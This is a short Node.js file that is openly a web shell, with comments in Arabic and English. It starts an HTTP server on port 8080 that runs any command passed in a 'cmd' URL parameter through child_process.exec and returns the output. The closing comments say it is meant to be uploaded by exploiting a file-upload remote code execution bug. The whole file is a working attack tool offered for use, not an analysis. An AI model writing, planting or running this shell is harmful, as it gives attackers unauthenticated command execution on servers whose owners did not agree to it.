const { exec } = require('child_process');
const http = require('http');

// بيفتح سيرفر صغير على بورت مختلف أو بيستمع لطلب معين
http.createServer((req, res) => {
    const url = new URL(req.url, `http://${req.headers.host}`);
    const cmd = url.searchParams.get('cmd'); // بياخذ الأمر من الرابط ?cmd=id
    
    if (cmd) {
        exec(cmd, (err, stdout, stderr) => {
            res.writeHead(200, {'Content-Type': 'text/plain'});
            res.end(stdout || stderr || err.message);
        });
    } else {
        res.end("Node.js Shell Active. Use ?cmd=YourCommand");
    }
}).listen(8080); // ملاحظة: ممكن تغير البورت إذا كان 8080 مشغول




// This codeing we will using with File Upload RCE Bug type and This file expresses the exploited File Upload RCE if server using .js lang ( The section follows the RCE Bug )
// Simple Web Shell for Node.js
